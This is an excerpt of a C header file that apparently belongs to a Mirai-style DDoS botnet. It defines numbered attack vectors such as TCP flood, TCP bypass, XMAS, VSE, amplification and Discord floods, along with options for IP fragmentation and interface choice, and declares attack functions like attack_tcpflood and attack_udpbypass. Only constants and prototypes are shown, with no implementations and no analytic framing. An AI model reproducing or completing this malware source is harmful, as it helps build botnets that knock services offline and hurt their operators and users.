...
#define ATK_VEC_TCPFLOOD        0
#define ATK_VEC_TCPBOOM         1
#define ATK_VEC_TCPKILLER       2
#define ATK_VEC_TCPBYPASS       3
#define ATK_VEC_TCPFRAG         4
#define ATK_VEC_XMAS            5

#define ATK_VEC_UDP_PLAIN       6
#define ATK_VEC_STD             7
#define ATK_VEC_UDPBYPASS       8
#define ATK_VEC_VSE             9
#define ATK_VEC_MIXAMP          10
#define ATK_VEC_DISCORD         11

#define ATK_VEC_HTTP            12
...
#define ATK_OPT_INTERFACE       30
#define ATK_OPT_CUSTOM          31
#define ATK_OPT_SADP_COUNT      32
#define ATK_OPT_VAC_SERVER      33
#define ATK_OPT_IP_MF           34
#define ATK_OPT_IP_FRAG_SIZE    35
...
// Tcp methods
void attack_tcpflood(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcpboom(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcpkiller(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcpbypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcpxmas(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
...
void attack_udpbypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_mixamp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
